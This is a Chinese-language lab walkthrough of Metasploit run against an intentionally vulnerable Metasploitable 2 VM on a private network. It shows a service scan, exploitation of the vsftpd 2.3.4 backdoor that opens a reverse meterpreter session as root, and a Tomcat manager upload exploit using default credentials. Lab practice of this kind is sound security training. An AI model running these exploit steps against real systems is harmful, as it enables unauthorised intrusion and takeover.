# Metasploit

目标机： metasploitable 2：192.168.122.228  
攻击机：kali linux：192.168.122.221

Metasploit Framework（MSF） 是一个开源的渗透测试与安全验证框架。 
## 基础 vsftpd
首先初始化数据库：  
``` bash
sudo msfdb init
```

然后进入 `msfconsole` 。  
可以在交互式命令行中输入 `db_status` 查看连接情况，应该要这样：  
```
[*] Connected to msf. Connection type: postgresql.
```

用 `db_nmap` 扫下 Metasploitable2 的 ip：  
```bash
db_nmap -sV 192.168.122.228 
```

输出：  
```
[*] Nmap: Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-17 20:27 +0800
[*] Nmap: Nmap scan report for 192.168.122.228
[*] Nmap: Host is up (0.0062s latency).
[*] Nmap: Not shown: 977 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE     VERSION
[*] Nmap: 21/tcp   open  ftp         vsftpd 2.3.4
[*] Nmap: 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
[*] Nmap: 23/tcp   open  telnet      Linux telnetd
[*] Nmap: 25/tcp   open  smtp        Postfix smtpd
[*] Nmap: 53/tcp   open  domain      ISC BIND 9.4.2
[*] Nmap: 80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
[*] Nmap: 111/tcp  open  rpcbind     2 (RPC #100000)
[*] Nmap: 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 512/tcp  open  exec?
[*] Nmap: 513/tcp  open  login       OpenBSD or Solaris rlogind
[*] Nmap: 514/tcp  open  shell?
[*] Nmap: 1099/tcp open  java-rmi    GNU Classpath grmiregistry
[*] Nmap: 1524/tcp open  bindshell   Metasploitable root shell
[*] Nmap: 2049/tcp open  nfs         2-4 (RPC #100003)
[*] Nmap: 2121/tcp open  ftp         ProFTPD 1.3.1
[*] Nmap: 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
[*] Nmap: 5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
[*] Nmap: 5900/tcp open  vnc         VNC (protocol 3.3)
[*] Nmap: 6000/tcp open  X11         (access denied)
[*] Nmap: 6667/tcp open  irc         UnrealIRCd
[*] Nmap: 8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
[*] Nmap: 8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
[*] Nmap: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bi
n/submit.cgi?new-service :
[*] Nmap: SF-Port514-TCP:V=7.99%I=7%D=8/17%Time=6A82FE1A%P=x86_64-pc-linux-gnu%r(NUL
[*] Nmap: SF:L,2B,"\x01Host\x20address\x20mismatch\x20for\x20192\.168\.122\.221\n");
[*] Nmap: MAC Address: 52:54:00:32:1D:0C (QEMU virtual NIC)
[*] Nmap: Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 62.82 seconds
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.33/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' a
nd '?' was replaced with '*' in regular expression
```

然后输入 `services`：  
输出：  
```
msf > services
Services
========

host             port  proto  name         state  info                                        resource  parents
----             ----  -----  ----         -----  ----                                        --------  -------
192.168.122.228  21    tcp    ftp          open   vsftpd 2.3.4                                {}
192.168.122.228  22    tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0  {}
192.168.122.228  23    tcp    telnet       open   Linux telnetd                               {}
192.168.122.228  25    tcp    smtp         open   Postfix smtpd                               {}
192.168.122.228  53    tcp    domain       open   ISC BIND 9.4.2                              {}
192.168.122.228  80    tcp    http         open   Apache httpd 2.2.8 (Ubuntu) DAV/2           {}
192.168.122.228  111   tcp    rpcbind      open   2 RPC #100000                               {}
192.168.122.228  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP   {}
192.168.122.228  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP   {}
192.168.122.228  512   tcp    exec         open                                               {}
192.168.122.228  513   tcp    login        open   OpenBSD or Solaris rlogind                  {}
192.168.122.228  514   tcp    shell        open                                               {}
192.168.122.228  1099  tcp    java-rmi     open   GNU Classpath grmiregistry                  {}
192.168.122.228  1524  tcp    bindshell    open   Metasploitable root shell                   {}
192.168.122.228  2049  tcp    nfs          open   2-4 RPC #100003                             {}
192.168.122.228  2121  tcp    ftp          open   ProFTPD 1.3.1                               {}
192.168.122.228  3306  tcp    mysql        open   MySQL 5.0.51a-3ubuntu5                      {}
192.168.122.228  5432  tcp    postgresql   open   PostgreSQL DB 8.3.0 - 8.3.7                 {}
192.168.122.228  5900  tcp    vnc          open   VNC protocol 3.3                            {}
192.168.122.228  6000  tcp    x11          open   access denied                               {}
192.168.122.228  6667  tcp    irc          open   UnrealIRCd                                  {}
192.168.122.228  8009  tcp    ajp13        open   Apache Jserv Protocol v1.3                  {}
192.168.122.228  8180  tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1         {}
```

说明目标机的信息已经保存。  

继续用 vsftpd 漏洞来过一遍：  
查询 vsftpd 漏洞，因为上面的 db_nmap 已经把目标机信息保存，这里就可以直接搜索到：  
```msf
search vsftpd
```

```
输出：  
Matching Modules
================
   #  Full Name                             Disclosure Date  Rank       Check  Name
   -  ---------                             ---------------  ----       -----  ----
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 and Earlier STAT Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution
Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
```

用 `use` 命令来利用这个漏洞：  
``` msf
use exploit/unix/ftp/vsftpd_234_backdoor 
```

此时命令行有所变化：  
```
msf > use exploit/unix/ftp/vsftpd_234_backdoor 
[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
msf exploit(unix/ftp/vsftpd_234_backdoor) >
```

用`info` 查看模块， `show options` 查看参数，`set` 进行设置。  
比如：
```
set RHOSTS 目标机IP
set RHOSTS 192.168.122.228
set LHOSTS 攻击机IP
set LHOSTS 192.168.122.221
```

然后用 `exploit` 就拿到 meterpreter 了：  
```
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] Started reverse TCP handler on 192.168.122.221:4444 
[*] 192.168.122.228:21 - Running automatic check ("set AutoCheck false" to disable)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.33/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.122.228:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] 192.168.122.228:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
[+] 192.168.122.228:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.122.221:4444 -> 192.168.122.228:35700) at 2026-08-17 20:42:41 +0800

meterpreter > 
```

可以用 `sysinfo` 和 `getuid` 等命令获得目标机信息:  
```
meterpreter > sysinfo
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: root
```

用 `shell` 就能拿到交互式控制台。  

MSF 的基本用法就是：  
```
search 漏洞 → use 模块 → set 参数 → exploit → 拿 shell
```

## tomcat(通过 web 上传恶意文件)

```
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.122.228
set RPORT 8180
set httpUsername tomcat
set httpPassword tomcat
show options
exploit
```
